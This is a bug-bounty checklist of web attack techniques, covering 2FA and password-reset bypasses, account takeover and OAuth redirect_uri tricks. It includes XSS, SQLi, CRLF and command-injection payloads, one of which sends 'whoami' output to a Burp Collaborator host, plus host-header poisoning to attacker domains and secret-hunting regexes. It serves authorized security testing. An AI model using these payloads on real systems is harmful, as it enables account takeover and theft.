# Bug-Bounty Checklist

(From Portswigger academy + random tips)

<details>
<summary>Burp Regexes</summary>

<dl>
<dd>

<details>
<summary>1 `Logger++`</summary>

<dl>
<dd>

Before you finish your day of hunting:   
search in all requests and check if the value is equal to `=https`.

---

## Request.Query CONTAINS "=https"

By doing this, you can modify the URL after the parameter to find potential SSRF, XSS, Open Redirects, etc.

</dd>
</dl>

</details>

<details>
<summary>S3 buckets finder</summary>

<dl>
<dd>

Test subdomains as s3 buckets.  
In burp proxy search for amazonaws you will get bucket names .  
Test them you may find sensitive or test data.

</dd>
</dl>

</details>

<details>
<summary>All in one regex</summary>

<dl>
<dd>

1. (?i)((access\_key|access\_token|admin\_pass|admin\_user|algolia\_admin\_key|algolia\_api\_key|alias\_pass|alicloud\_access\_key|amazon\_secret\_access\_key|amazonaws|ansible\_vault\_password|aos\_key|api\_key|api\_key\_secret|api\_key\_sid|api\_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app\_debug|app\_id|app\_key|app\_log\_level|app\_secret|appkey|appkeysecret|application\_key|appsecret|appspot|auth\_token|authorizationToken|authsecret|aws\_access|aws\_access\_key\_id|aws\_bucket|aws\_key|aws\_secret|aws\_secret\_key|aws\_token|AWSSecretKey|b2\_app\_key|bashrc password|bintray\_apikey|bintray\_gpg\_password|bintray\_key|bintraykey|bluemix\_api\_key|bluemix\_pass|browserstack\_access\_key|bucket\_password|bucketeer\_aws\_access\_key\_id|bucketeer\_aws\_secret\_access\_key|built\_branch\_deploy\_key|bx\_password|cache\_driver|cache\_s3\_secret\_key|cattle\_access\_key|cattle\_secret\_key|certificate\_password|ci\_deploy\_password|client\_secret|client\_zpk\_secret\_key|clojars\_password|cloud\_api\_key|cloud\_watch\_aws\_access\_key|cloudant\_password|cloudflare\_api\_key|cloudflare\_auth\_key|cloudinary\_api\_secret|cloudinary\_name|codecov\_token|config|conn.login|connectionstring|consumer\_key|consumer\_secret|credentials|cypress\_record\_key|database\_password|database\_schema\_test|datadog\_api\_key|datadog\_app\_key|db\_password|db\_server|db\_username|dbpasswd|dbpassword|dbuser|deploy\_password|digitalocean\_ssh\_key\_body|digitalocean\_ssh\_key\_ids|docker\_hub\_password|docker\_key|docker\_pass|docker\_passwd|docker\_password|dockerhub\_password|dockerhubpassword|dot-files|dotfiles|droplet\_travis\_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica\_host|elastica\_port|elasticsearch\_password|encryption\_key|encryption\_password|env.heroku\_api\_key|env.sonatype\_password|eureka.awssecretkey)[a-z0-9\_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}'\"['\"]

2. `(?i)(access_key|accessKeyId|accessKeySecret|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)['" ]+(=|:)`

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Subdomain Takeover</summary>

<dl>
<dd>

<details>
<summary>Escalating Impact</summary>

<dl>
<dd>

What all you can do with Subdomain Takeover -

- Cookies stealing, If cookies are set with domain attribute set to the hijacked subdomain , check all subs for this.

- CORS request, If Access-Control-Allow-Origin is set to hijacked subdomain.

- Oauth redirection to get authorization code, If the hijacked subdomain is whitelisted.

- CSP policies for XSS, IF CSP policy whitelists this subdomain.

- ClickJacking, If X-Frame-Options whitelists this subdomain.

- Spoof mails, If SPF record whitelists this subdomain.

- It has **previously come to light** that internal emails can be actively intercepted just by claiming a simple webhook of the third-party service (e.g. *Sendgrid*) which an application might be using for email marketing.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Authentication</summary>

<dl>
<dd>

<details>
<summary>Authentication vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Flaws in password-based authentication</summary>

<dl>
<dd>

1. You might sometimes find that your IP is blocked if you fail to log in too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means an attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached. In this case, merely including your own login credentials at regular intervals throughout the wordlist is enough to render this defense virtually useless.

2. Bypassing rate-limiting

3. HTTP basic authentication flaws : Bruteforcing can be done here for username/password enumeration : e.g, `Authorization: Basic base64(username:password)`

</dd>
</dl>

</details>

<details>
<summary>Flaws in multi-factor authentication</summary>

<dl>
<dd>

1. If the user is first prompted to enter a password, and then prompted to enter a verification code on a separate page, the user is effectively in a "logged in" state before they have entered the verification code. In this case, it is worth testing to see if you can directly skip to "logged-in only" pages after completing the first authentication step. Occasionally, you will find that a website doesn't actually check whether or not you completed the second step before loading the page.

<details>
<summary>Flawed two-factor verification logic :</summary>

<dl>
<dd>

<details>
<summary>Broken 2FA logic</summary>

<dl>
<dd>

Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

For example, the user logs in with their normal credentials in the first step as follows:

`POST /login-steps/first HTTP/1.1  
Host: vulnerable-website.com  
...  
username=carlos&password=qwerty`

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

`HTTP/1.1 200 OK  
Set-Cookie: account=carlos  
  
GET /login-steps/second HTTP/1.1  
Cookie: account=carlos`

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

`POST /login-steps/second HTTP/1.1  
Host: vulnerable-website.com  
Cookie: account=carlos  
...  
verification-code=123456`

In this case, an attacker could log in using their own credentials but then change the value of the `account` cookie to any arbitrary username when submitting the verification code.

`POST /login-steps/second HTTP/1.1  
Host: vulnerable-website.com  
Cookie: account=victim-user  
...  
verification-code=123456`

This is extremely dangerous if the attacker is then able to brute-force the verification code as it would allow them to log in to arbitrary users' accounts based entirely on their username. They would never even need to know the user's password.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Bruteforcing 2FA codes.</summary>



</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Recon:  
While exploring different subdomains of a company, we found that some of them let you log in using the main application's account. Just clicking the "Login with Main Account" button gives you easy access to the same account in that specific web app.

Assumption:  
Curiosity led us to wonder what might happen if we activated 2FA on the main web application account and then explore these subdomains one by one, clicking on the "Login with X" button to see if any of them could authenticate us to the main account without 2FA.

The Issue:  
To our surprise, one of the subdomains featured a "Login with Main X" button. Even with 2FA enabled on the main account, this subdomain logged us in without showing any 2FA screens. This posed a serious security concern as the intended 2FA protection was circumvented.

</dd>
</dl>

</details>

<details>
<summary>2FA Bypass techniques</summary>

<dl>
<dd>

1. https://twitter.com/TodayCyberNews/status/1484882978337542145?s=20&t=z6jIGsBhQjafvRUFg5zGzg

<details>
<summary>Method 2</summary>

<dl>
<dd>

1. Create an account on http://domain.com

2. Enable the 2FA via authenticator app

3. Now logout the account

4. Goto forgot password page

5. Reset password

6. Change the password and click on Save changes

7. It was observed that without 2FA attacker was able to login

</dd>
</dl>

</details>

<details>
<summary>other methods</summary>

<dl>
<dd>

1. HTTP Response Body Manipulation

2. HTTP Response Status Code Manipulation

3. Direct Request/Forceful Browsing

4. CSRF & Clickjacking to Disable MFA

5. Cached OTP in Dynamic JS Files

6. Missing Integrity Checks on OTP : Using other account valid OTP for diff account.

7. Missing Brute-Force Protection on OTP Validation

8. OTP Code Reusability

9. Code Leakage in Response

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Response/Status Code Manipulation.

2. Brute force otp.

3. Otp doesn't expire after usage.

4. Request 2 tokens from account A and V. Use the A's token in V's account.

5. Try to go directly to the dashboard URL without solving the 2FA. If not success then try adding the referral header to the 2FA page url while going to dashboard.

6. Search the 2FA code in response/js files using burp search.

7. CSRF/Clickjacking to disable 2FA.

8. Enabling 2FA doesn't expire previous sessions.

9. Login using OAuth to bypass 2FA [Mostly N/A].

10. No 2FA required for disabling 2FA.

11. Password can be reset via forgot password without 2FA.

12. Enter 0's in the code. For example, if it's a 6 digit code use 000000 as 2FA.

13. Request Manipulation: Try sending null response for JSON, change the "otprequired" parameter from true to false[Application may allow to create an account using that phone number without any otp validation], remove the 2fa code, remove both code and parameter, in JSON give email as an array, my medium writeup.

14. OpenID Misconfiguration

15. Code doesn't expire after 4-5 hours.

16. Backup code facility: After successful login, generate the backup code generate request from your browser. You may able to get the backup codes. Generate the following request after login:

```
POST /api/enable-2fa HTTP/1.1
Host: target.com
........

{"action":"backup_codes","email":"victim@gmail.com"}
```

See here.

1. Check whether 2FA page is diclosing some sensitive info that you didn't know previously (like Ph. No.).

2. Permanent Dos on Unregistered Users:

```
        I. Create an account with victim@gmail.com (If there is no email verification). Now enable 2FA in the account. So now victim can't create an account as it'll ask for 2FA code.
        II. Can't enable 2fa without email verification? Register with your email and verify it ---> Enable 2fa ---> Change your email to victim.
```

1. Try to perform different authenticated requests(profile details change, api create/delete etc) without solving the 2fa.

2. OTP Bypass in JSON:

```
{
        "code":[
                "1000",
                "1001",
                "1002",
                "1003",
                "1004",
                ...
                "9999"
                ]
}
```

1. Backup code abuse using the above methods.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Flaws in Reset password option</summary>

<dl>
<dd>

1. Guessable parameters in reset password URLs can lead to reseting password of other users accounts. Look for guessable and bruteforcable parameters in these URLs.

<details>
<summary>Using password reset poisoning techniques :</summary>

<dl>
<dd>

1. Basic : While submitting reset password request → intercept → change the `Host:` header to server you controll. e.g , evilxyz.com

2. Via Middleware : Same above process but use middleware headers instead of host-header , such as `X-Forwarded-Host` and add your exploit server URL there.

3. Via Dangling Markup : use this technique add the header like this :

`Host: site.com:'<a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?`

</dd>
</dl>

</details>

<details>
<summary>Changing user passwords</summary>

<dl>
<dd>

look for guessable/bruteforceable params here for win.

Also if current-password validity check can be bypassed - this is a vuln too.

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

Try input No TLD in Email Value of the Parameter  
Example:

POST /reset  
[…]  
email=victimemail@mail.secry

POST /reset  
[…]  
email=victim@mail.com%0a%0dcc:hacker@secry.me

</dd>
</dl>

</details>

<details>
<summary>Password Reset Link not expiring after changing the email</summary>

<dl>
<dd>

**Proof Of Concept:**

1.Send the password reset link to your email.  
2.Don`t open the password link just copy it and paste into any editor.  
3.Open your account.  
4.Go to your account settings.  
5.Under account, you will see Account Overview.  
6.Go to the Email and password Option and change the email and verify it.  
7.After changing the email go to your password reset link which you copied.  
8.Change your password.

BooM password Changed.

</dd>
</dl>

</details>

<details>
<summary>Forgot password endpoint `Tip` :</summary>

<dl>
<dd>

Forget password endpoints with error code parameters:

"/forgetpass.xxx?error=1"

Try to change the value of error code to 0-10, It might give you direct access to password change page without verifying any email or 2FA.

</dd>
</dl>

</details>

<details>
<summary>Password Reset:</summary>

<dl>
<dd>

Reset userpassword:

user@email.com.burpcolaborator.com

</dd>
</dl>

</details>

<details>
<summary>Checklist</summary>

<dl>
<dd>

1. Look for Password Reset Poisoning.

2. HTTP Parameter Pollution:

```
email=victim@gmail.com&email=attacker@gmail.com
email[]=victim@gmail.com&email[]=attacker@gmail.com
email=victim@gmail.com%20email=attacker@gmail.com
email=victim@gmail.com|email=attacker@gmail.com
{"email":"victim@gmail.com","email":"attacker@gmail.com"}
{"email":["victim@gmail.com","attacker@gmail.com"]}
```

Check if you can reset victim's password using the link received in attacker's inbox.

1. Look for IDOR while resetting password through password reset link. Use paramminer to discover additional parameters or append previously known parameters (For example, you may find a parameter uid while updating your profile) in the request.

2. Broken Crypto - Check if you can guess how the password reset tokens are generated.

3. Password reset token Leakage via referral header - Open the password reset link and click on any external links available in the page.

4. Token leakage in response/JS files - Search for the password reset token in the response of the request or in JS files.

5. Session/Token is not expiring after password reset.

6. Weak Password Policy - Add only space in password.

7. Request for 2 password reset links and try the older one.

8. Try:

```
POST https://attacker.com/resetpassword.php HTTP/1.1
POST @attacker.com/resetpassword.php HTTP/1.1
POST :@attacker.com/resetpassword.php HTTP/1.1
POST /resetpassword.php@attacker.com HTTP/1.1
```

Check if the password reset link is manipulated or not.

1. SQLi: `test@test.com'+(select*from(select(sleep(2)))a)+'`

2. CRLF: `/resetpassword?%0d%0aHost:%20attacker.com`

3. Register with a username identical to the victim's username, but with white spaces inserted before and/or after the username("tuhin1729 ", " tuhin1729 " etc). Try a password reset for your account. Use the token to reset victim's password. A similar vulnerability was found in CTFd (CVE-2020-7245)

4. Application Level DoS - Try to set a very long password and check if the response time is delayed or if you get a 5xx response.

5. If they are sending an otp for password reset, try 2FA Bypass techniques.

6. During registration, use homograph in email. Now try password reset.

7. Change the request method and content-type and observer how the application is responding.

8. Append null bytes after your email and observe the response.

9. Try XSS, SSTI etc in the email field.

10. Try Command injection by `` email=hello@`whoami`.xyz.burpcollaborator.net ``

11. 2FA auto disabled after password reset.

12. User Enumeration.

13. Check whether any param value is reflecting in the email. Now try HTMLi.

14. XXE (if forgot-password request accepts xml).

15. Missing Rate Limit - Email triggering.

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

hunting on API with JSON format? go to reset password and try to submit 2 emails separated with "\n" as:

{"action":"reset-password", "email":"accA@mail.com\naccB@mail.com"}

</dd>
</dl>

</details>

<details>
<summary>Tip</summary>

<dl>
<dd>

If a parameter in password reset request is: email=victim@gmail.com

1- Try email=attacker@gmail.com

2- Try email=victim@gmail.com,attacker@gmail.com

3- Try email=victim@gmail.com&email=attacker@gmail.com

3- Try email=victim@gmail.com,cc: attacker@gmail.com

4- Try email=victim@gmail.com\ncc: attacker@gmail.com

5- Try {"email": "victim@gmail.com", "email":"attacker@gmail.com"}

6- Try {"email": "[victim@gmail.com", "attacker@gmail.com"]}

7- Try email=“victim@mail.tld$%0a%0d$cc: attacker@mail.tld” --> Hussein Daher ThreatCon Fuzzing Technique

7- Try user[email][]=victim@gmail.com&user[email][]=attacker@gmail.com --> CVE-2023-7028

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>IDN homograph bug `TIP`</summary>

<dl>
<dd>

Account takeover due to unicode normalization issue.

- Victim account: ynoof@hotmail.com

- Attacker account: ynoⓞf@hotmail.com

Due to no validation send to the email and some unicode issues , this leads to account takeover.

<details>
<summary>POC</summary>

<dl>
<dd>

1. Find target email, create email with punycode version

2. Reset password with unicoded version

3. Find reset password link in attacker's creates email adress

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Account Takeover by reset token exposure (Burp history)</summary>

<dl>
<dd>

Now this is a really cool tip to try when testing web apps:

1. Set up Burp in browser1

2. Do a password reset request in browser1

3. Open the password reset email in browser2 (without Burp) and copy the token

4. Search your Burp history (browser1) for the token. If it is there, you’ve got yourself a nice easy account takeover!

</dd>
</dl>

</details>

<details>
<summary>Session Invalidation issues</summary>

<dl>
<dd>

This is a quick tip to quickly find whether the web application is properly invalidating sessions after logout or if there are any caching control security issues:

1. Log in to the application

2. Navigate around the pages

3. Logout

4. Press ( Alt + left-arrow ) buttons

5. If you are logged in or can view the pages navigated earlier by the user, then give yourself a pat.

</dd>
</dl>

</details>

<details>
<summary>Click Jacking to Account-Takeover</summary>

<dl>
<dd>

https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/

</dd>
</dl>

</details>

<details>
<summary>XSS in email param</summary>

<dl>
<dd>

another Tips for xss vulnerability,  
If you have a parameter call 'email'  
just try this payload:

1. test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E

2. "<img/src/onerror=alert(0)"@xss.com

3. "mitsec<form/><!><details/open/ontoggle=alert(document.domain)>"@gmail.com

</dd>
</dl>

</details>

<details>
<summary>Email input Payloads</summary>

<dl>
<dd>

![](Untitled.png)

</dd>
</dl>

</details>

<details>
<summary>Account Takeover Tips</summary>

<dl>
<dd>

<details>
<summary>Tip 2</summary>

<dl>
<dd>

Seperator:  
email=victim@mail.com,hacker@mail.com

email=victim@mail.com%20hacker@mail.com  
email=victim@mail.com|hacker@mail.com

Array:  
{"email":"[victim@mail.com","hacker@mail.com"]}

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Unicode Normalization</summary>

<dl>
<dd>

1. victim account

```
victim@gmail.com
```

2. create an account using Unicode

example: vićtim@gmail.com

here is ć is an Unicode character

</dd>
</dl>

</details>

<details>
<summary>Pre account takeovers</summary>

<dl>
<dd>

One of the other more common issues I see is when applications allow “Sign in with X” but also username/password. There are 2 different ways to attack this:

1. If the application does **not require email verification on account creation**, try **creating an account with a victim’s email address and attacker password** before the victim has registered. If the **victim** then tries to register or sign in **with a third party**, such as Google, it’s possible the application will do a lookup, see that email is already registered, then l**ink their Google account to the attacker created account**. This is a “**pre account takeover**” where an attacker will have access to the victim’s account if they created it prior to the victim registering.

2. If an **OAuth app does not require email verification**, try signing up with that OAuth app and then change the email address with a **victim’s email address**. The same issue as above could exist, but you’d be attacking it from the other direction and getting access to the victim’s account for an account takeover.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>OAuth vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Identifying OAuth authentication</summary>

<dl>
<dd>

1. Recognizing when an application is using OAuth authentication is relatively straightforward. If you see an option to log in using your account from a different website, this is a strong indication that OAuth is being used.

2. The most reliable way to identify OAuth authentication is to proxy your traffic through Burp and check the corresponding HTTP messages when you use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the `/authorization` endpoint containing a number of query parameters that are used specifically for OAuth. In particular, keep an eye out for the `client_id`, `redirect_uri`, and `response_type` parameters. For example, an authorization request will usually look something like this:

`GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1  
Host: oauth-authorization-server.com`

</dd>
</dl>

</details>

<details>
<summary>Recon</summary>

<dl>
<dd>

Doing some basic recon of the OAuth service being used can point you in the right direction when it comes to identifying vulnerabilities.

It goes without saying that you should study the various HTTP interactions that make up the OAuth flow - we'll go over some specific things to look out for later. If an external OAuth service is used, you should be able to identify the specific provider from the hostname to which the authorization request is sent. As these services provide a public API, there is often detailed documentation available that should tell you all kinds of useful information, such as the exact names of the endpoints and which configuration options are being used.

Once you know the hostname of the authorization server, you should always try sending a `GET` request to the following standard endpoints:

`/.well-known/oauth-authorization-server`

`/.well-known/openid-configuration`

These will often return a JSON configuration file containing key information, such as details of additional features that may be supported. This will sometimes tip you off about a wider attack surface and supported features that may not be mentioned in the documentation.

</dd>
</dl>

</details>

<details>
<summary>Vulnerabilities</summary>

<dl>
<dd>

<details>
<summary>Vulnerabilities in the OAuth client application</summary>

<dl>
<dd>

<details>
<summary>Improper implementation of the implicit grant type</summary>

<dl>
<dd>

<details>
<summary>Details</summary>

<dl>
<dd>

Due to the dangers introduced by sending access tokens via the browser, the implicit grant type is mainly recommended for single-page applications. However, it is also often used in classic client-server web applications because of its relative simplicity.

In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accesses the token using JavaScript. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store the current user data (normally a user ID and the access token) somewhere.

To solve this problem, the client application will often submit this data to the server in a `POST` request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted.

In the implicit flow, this `POST` request is exposed to attackers via their browser. As a result, this behavior can lead to a serious vulnerability if the client application doesn't properly check that the access token matches the other data in the request. In this case, an attacker can simply change the parameters sent to the server to impersonate any user.

</dd>
</dl>

</details>

<details>
<summary>Issue</summary>

<dl>
<dd>

<details>
<summary>Authentication bypass via OAuth implicit flow</summary>

<dl>
<dd>

After the user-info is received from 0Auth service to client application , modify the email to victim email and get-logged into victim account.

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Flawed CSRF protection</summary>

<dl>
<dd>

<details>
<summary>Details</summary>

<dl>
<dd>

Although many components of the OAuth flows are optional, some of them are strongly recommended unless there's an important reason not to use them. One such example is the `state` parameter.

The `state` parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client application and the OAuth service as a form of CSRF token for the client application. Therefore, if you notice that the authorization request does not send a `state` parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack. This can have severe consequences depending on how OAuth is being used by the client application.

Consider a website that allows users to log in using either a classic, password-based mechanism or by linking their account to a social media profile using OAuth. In this case, if the application fails to use the `state` parameter, an attacker could potentially hijack a victim user's account on the client application by binding it to their own social media account.

</dd>
</dl>

</details>

<details>
<summary>Issue</summary>

<dl>
<dd>

Forced OAuth profile linking : `only applicable when there is no `state` **param in the 0Auth profile linking request.**

- https://gaya3-r.medium.com/account-takeover-using-oauth-misconfiguration-3fab424317c1

</dd>
</dl>

</details>

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Vulnerabilities in the OAuth service</summary>

<dl>
<dd>

<details>
<summary>Leaking authorization codes and access tokens</summary>

<dl>
<dd>

<details>
<summary>Issue 1</summary>

<dl>
<dd>

<details>
<summary>Details</summary>

<dl>
<dd>

Perhaps the most infamous OAuth-based vulnerability is when the configuration of the OAuth service itself enables attackers to steal authorization codes or access tokens associated with other users' accounts. By stealing a valid code or token, the attacker may be able to access the victim's data. Ultimately, this can completely compromise their account - the attacker could potentially log in as the victim user on any client application that is registered with this OAuth service.

Depending on the grant type, either a code or token is sent via the victim's browser to the `/callback` endpoint specified in the `redirect_uri` parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victim's browser into initiating an OAuth flow that will send the code or token to an attacker-controlled `redirect_uri`.

In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate `/callback` endpoint (the original `redirect_uri`) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.

Note that using `state` or `nonce` protection does not necessarily prevent these attacks because an attacker can generate new values from their own browser.

More secure authorization servers will require a `redirect_uri` parameter to be sent when exchanging the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second `redirect_uri` parameter.

</dd>
</dl>

</details>

<details>
<summary>Issue : Stealing 0Auh access\_token using redirect\_uri= param</summary>

<dl>
<dd>

https://hackerone.com/reports/665651

</dd>
</dl>

</details>

<details>
<summary>bypass</summary>

<dl>
<dd>

Found an interesting open redirect bypass today. Target would only allow \*.target.com, but if you entered hxxp://evil.com%EF%BC%http://A1.target.com, the backed would return hxxp://evil.com/?.target.com

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Issue 2</summary>

<dl>
<dd>

<details>
<summary>Details : `Flawed redirect_uri validation`</summary>

<dl>
<dd>

Due to the kinds of attacks seen in the previous issue 1, it is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the `redirect_uri` parameter against this whitelist. In this case, supplying an external URI will likely result in an error. However, there may still be ways to bypass this validation.

When auditing an OAuth flow, you should try experimenting with the `redirect_uri` parameter to understand how it is being validated. For example:

- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters i.e. an approved domain. You should try removing or adding arbitrary paths, query parameters, and fragments to see what you can change without triggering an error.

- If you can append extra values to the default `redirect_uri` parameter, you might be able to exploit discrepancies between the parsing of the URI by the different components of the OAuth service. For example, you can try techniques such as:`https://default-host.com &@foo.evil-user.net#@bar.evil-user.net/`

  If you're not familiar with these techniques, we recommend reading our content on how to circumvent common SSRF defences and CORS.

- You may occasionally come across server-side parameter pollution vulnerabilities. Just in case, you should try submitting duplicate `redirect_uri` parameters as follows:`https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net`

- Some servers also give special treatment to `localhost` URIs as they're often used during development. In some cases, any redirect URI beginning with `localhost` may be accidentally permitted in the production environment. This could allow you to bypass the validation by registering a domain name such as `localhost.evil-user.net`.

It is important to note that you shouldn't limit your testing to just probing the `redirect_uri` parameter in isolation. In the wild, you will often need to experiment with different combinations of changes to several parameters. Sometimes changing one parameter can affect the validation of others. For example, changing the `response_mode` from `query` to `fragment` can sometimes completely alter the parsing of the `redirect_uri`, allowing you to submit URIs that would otherwise be blocked. Likewise, if you notice that the `web_message` response mode is supported, this often allows a wider range of subdomains in the `redirect_uri`.

</dd>
</dl>

</details>

<details>
<summary>Must try this trick in every redirect\_uri</summary>

<dl>
<dd>

https://hackerone.com/reports/861940

</dd>
</dl>

</details>

<details>
<summary>Tip 1</summary>

<dl>
<dd>

Use IDN homograph technique in `redirect_uri` param’s domain.

</dd>
</dl>

</details>

<details>
<summary>Tip 2 `redirect_uri`</summary>

<dl>
<dd>

1. redirect\_uri=target\attacker\.org\com

2. redirect\_uri=target.\com%40myburpcollab.\com

3. https://target.com//abd.com/It will Redirect you to //abd.com/

4. `https://www.target.com%09.abd.com` it will also redirect to //abd.com

5. `?next=https://www.target.com%252e.abd.com`

</dd>
</dl>

</details>

<details>
<summary>`redirect_uri` validatio bypass through URL-Encode chars FUZZ</summary>

<dl>
<dd>

`https://target.com/api/oauth?code=&state=https://evil.com$FUZZ$.target.com/`

<details>
<summary>Payloads</summary>

<dl>
<dd>

```
%00
%01
%02
%03
%04
%05
%06
%07
%08
%09
%0a
%0b
%0c
%0d
%0e
%0f
%10
%11
%12
%13
%14
%15
%16
%17
%18
%19
%1a
%1b
%1c
%1d
%1e
%1f
%20
%21
%22
%23
%24
%25
%26
%27
%28
%29
%2a
%2b
%2c
%2d
%2e
%2f
%30
%31
%32
%33
%34
%35
%36
%37
%38
%39
%3a
%3b
%3c
%3d
%3e
%3f
%40
%41
%42
%43
%44
%45
%46
%47
%48
%49
%4a
%4b
%4c
%4d
%4e
%4f
%50
%51
%52
%53
%54
%55
%56
%57
%58
%59
%5a
%5b
%5c
%5d
%5e
%5f
%60
%61
%62
%63
%64
%65
%66
%67
%68
%69
%6a
%6b
%6c
%6d
%6e
%6f
%70
%71
%72
%73
%74
%75
%76
%77
%78
%79
%7a
%7b
%7c
%7d
%7e
%7f
%80
%81
%82
%83
%84
%85
%86
%87
%88
%89
%8a
%8b
%8c
%8d
%8e
%8f
%90
%91
%92
%93
%94
%95
%96
%97
%98
%99
%9a
%9b
%9c
%9d
%9e
%9f
%a0
%a1
%a2
%a3
%a4
%a5
%a6
%a7
%a8
%a9
%aa
%ab
%ac
%ad
%ae
%af
%b0
%b1
%b2
%b3
%b4
%b5
%b6
%b7
%b8
%b9
%ba
%bb
%bc
%bd
%be
%bf
%c0
%c1
%c2
%c3
%c4
%c5
%c6
%c7
%c8
%c9
%ca
%cb
%cc
%cd
%ce
%cf
%d0
%d1
%d2
%d3
%d4
%d5
%d6
%d7
%d8
%d9
%da
%db
%dc
%dd
%de
%df
%e0
%e1
%e2
%e3
%e4
%e5
%e6
%e7
%e8
%e9
%ea
%eb
%ec
%ed
%ee
%ef
%f0
%f1
%f2
%f3
%f4
%f5
%f6
%f7
%f8
%f9
%fa
%fb
%fc
%fd
%fe
%ff
```

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Tip 3 `payloads`</summary>

<dl>
<dd>

trarget.\com/%09/myburpcollab  
trarget.\com//myburpcollab  
trarget.\com\\myburpcollab  
target.\com/%0d/myburpcollab  
redirect\_uri=target.\com&redirect\_uri=attacker\.com

- http://target.com%2f%2f.victim.com

- http://target.com%5c%5c.victim.com

- http://target.com%3F.victim.com

- http://target.com%23.victim.com

- http://target.com:80%40example.com

- http://target.com%2eexample.com

</dd>
</dl>

</details>

<details>
<summary>Tip 4 `TLD suffix confusion`</summary>

<dl>
<dd>

We can bypass certain checks if a suitable top-level domain is specified. We can  
bypass the redirect\_uri with a .com TLD by replacing it with a suffix such as  
.com.mx

.com.br etc…

</dd>
</dl>

</details>

<details>
<summary>Regex validation bypass</summary>

<dl>
<dd>

Bad regex in redirect\_url parameter like www(.)example(.)com/any-path can also lead to leakage of oauth token if you can find a open redirect on any another endpoint which is not harmful

</dd>
</dl>

</details>

<details>
<summary>Another tip</summary>

<dl>
